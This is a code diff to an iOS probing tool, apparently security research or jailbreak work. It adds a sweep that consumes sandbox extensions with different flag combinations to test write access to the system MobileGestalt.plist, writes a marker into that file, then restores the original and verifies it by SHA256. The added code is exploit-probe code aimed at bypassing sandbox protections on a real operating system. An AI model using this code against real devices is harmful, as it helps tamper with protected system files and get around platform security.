@@ -602,6 +602,21 @@ static NSString *buildTextReport(NSDictionary *report)
                 variant[@"Mkdir"], variant[@"MkdirErrno"], variant[@"WriteFile"],
                 variant[@"ReadBackVerified"]];
         }
+        NSArray *sweep = [writeProbe[@"GestaltSweep"] isKindOfClass:NSArray.class]
+            ? writeProbe[@"GestaltSweep"] : @[];
+        if (sweep.count > 0) {
+            [text appendString:@"Gestalt writable-extension sweep:\n"];
+            for (NSDictionary *entry in sweep) {
+                [text appendFormat:@"  flags=%@ part=%@ trav=%@ handle=%@ W_OK=%@",
+                    entry[@"Flags"], entry[@"Part"], entry[@"Traversal"],
+                    entry[@"Handle"], entry[@"Writable"] ?: entry[@"Status"]];
+                if ([entry[@"WriteBack"] isKindOfClass:NSNumber.class])
+                    [text appendFormat:@" writeBack=%@", entry[@"WriteBack"]];
+                if ([entry[@"SHA256Match"] isKindOfClass:NSNumber.class])
+                    [text appendFormat:@" shaMatch=%@", entry[@"SHA256Match"]];
+                [text appendString:@"\n"];
+            }
+        }
     }
 
     [text appendString:@"\n--- [7] Full step log ---\n"];
@@ -1272,6 +1287,77 @@ static NSMutableDictionary *runWriteProbe(void)
         result[@"ActivateFalse"] = runActivateVariant(ownContainer, NO);
         result[@"ActivateTrue"] = runActivateVariant(ownContainer, YES);
     }
+
+    // 4) Writable-extension sweep for MobileGestalt.plist: the plist lives
+    // in the mobilegestaltcache group's Library/Caches subtree (part 3),
+    // owned by mobile (uid 501) with write bits — DAC is NOT the wall. The
+    // wall is that matrix extensions covering it are read-only. Sweep the
+    // token-ok combos (esp. part=3 without traversal) with a full write test.
+    NSString *gestaltPlist = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
+    NSArray<NSDictionary *> *sweep = @[
+        @{@"Flags": @(0x900000000ULL), @"Part": @3, @"Traversal": @NO},
+        @{@"Flags": @(0x900000000ULL), @"Part": @0, @"Traversal": @NO},
+        @{@"Flags": @(0x800000000ULL), @"Part": @3, @"Traversal": @NO},
+        @{@"Flags": @(0x800000000ULL), @"Part": @0, @"Traversal": @NO},
+        @{@"Flags": @(0x900000000ULL), @"Part": @0, @"Traversal": @YES},
+        @{@"Flags": @(0x800000000ULL), @"Part": @0, @"Traversal": @YES},
+    ];
+    NSMutableArray *sweepResults = [NSMutableArray array];
+    NSData *originalPlist = [NSData dataWithContentsOfFile:gestaltPlist];
+    for (NSDictionary *combo in sweep) {
+        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
+        entry[@"Flags"] = [NSString stringWithFormat:@"0x%llx",
+            [combo[@"Flags"] unsignedLongLongValue]];
+        entry[@"Part"] = combo[@"Part"];
+        entry[@"Traversal"] = combo[@"Traversal"];
+        int64_t h = BadQueryConsumeCombo(gestaltPlist,
+            @"systemgroup.com.apple.mobilegestaltcache",
+            [combo[@"Flags"] unsignedLongLongValue],
+            [combo[@"Part"] unsignedIntegerValue],
+            [combo[@"Traversal"] boolValue]);
+        entry[@"Handle"] = @(h);
+        if (h < 0) {
+            entry[@"Status"] = @"consume-failed";
+            logStep(NO, @"gestalt sweep consume",
+                [NSString stringWithFormat:@"flags=%@ part=%@ trav=%@ code=%lld",
+                    entry[@"Flags"], combo[@"Part"], combo[@"Traversal"], h]);
+            [sweepResults addObject:entry];
+            continue;
+        }
+        errno = 0;
+        BOOL writable = access(gestaltPlist.UTF8String, W_OK) == 0;
+        entry[@"Writable"] = @(writable);
+        entry[@"WErrno"] = @(writable ? 0 : errno);
+        logStep(writable, @"gestalt sweep W_OK",
+            [NSString stringWithFormat:@"flags=%@ part=%@ trav=%@ handle=%lld -> %@",
+                entry[@"Flags"], combo[@"Part"], combo[@"Traversal"], h,
+                writable ? @"WRITABLE!" : [NSString stringWithFormat:@"errno=%d", errno]]);
+        if (writable && originalPlist) {
+            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
+            if ([plist isKindOfClass:NSDictionary.class]) {
+                NSMutableDictionary *modified = [plist mutableCopy];
+                modified[@"FuckFileWriteTest"] = @([[NSDate date] timeIntervalSince1970]);
+                BOOL wrote = [modified writeToFile:gestaltPlist atomically:YES];
+                entry[@"WriteBack"] = @(wrote);
+                logStep(wrote, @"gestalt sweep write-back",
+                    wrote ? @"marker written!" : @"write failed");
+                NSDictionary *readBack = [NSDictionary dictionaryWithContentsOfFile:gestaltPlist];
+                entry[@"MarkerReadBack"] = @([readBack[@"FuckFileWriteTest"] isKindOfClass:NSNumber.class]);
+                BOOL restored = originalPlist ? [originalPlist writeToFile:gestaltPlist atomically:YES] : NO;
+                entry[@"Restored"] = @(restored);
+                NSData *after = [NSData dataWithContentsOfFile:gestaltPlist];
+                BOOL shaOk = after.length && [sha256Hex(after) isEqualToString:sha256Hex(originalPlist)];
+                entry[@"SHA256Match"] = @(shaOk);
+                logStep(shaOk, @"gestalt sweep restore+verify",
+                    shaOk ? @"original intact" : @"MISMATCH!");
+            } else {
+                entry[@"ParseError"] = @"plist unreadable";
+            }
+        }
+        entry[@"Status"] = writable ? @"writable" : @"readonly";
+        [sweepResults addObject:entry];
+    }
+    result[@"GestaltSweep"] = sweepResults;
 
     logLine(@"==== write capability probe done ====");
     return result;
